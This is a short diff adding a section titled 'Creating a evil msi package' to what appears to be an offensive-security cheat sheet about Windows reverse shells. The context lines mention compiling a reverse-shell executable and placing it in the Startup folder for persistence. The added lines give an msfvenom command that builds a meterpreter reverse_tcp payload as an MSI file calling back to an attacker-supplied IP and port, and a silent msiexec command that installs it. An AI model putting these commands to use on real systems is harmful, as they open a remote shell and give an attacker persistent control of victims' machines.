@@ -499,3 +499,12 @@ i686-w64-mingw32-g++ re.cpp -o re.exe -lws2_32 -lwininet -s -ffunction-sections 
 3. Log off and log in to execute your reverse TCP.
 C:\Users\<CurrentProfile>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 ```
+
+### [Creating a evil msi package]
+```
+1. Create your msi payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o badsetup.msi
+2. Transfer your payload over to your windows host/
+3. Execute your msi payload
+msiexec /quiet /qn /i C:\Temp\badsetup.msi
+```
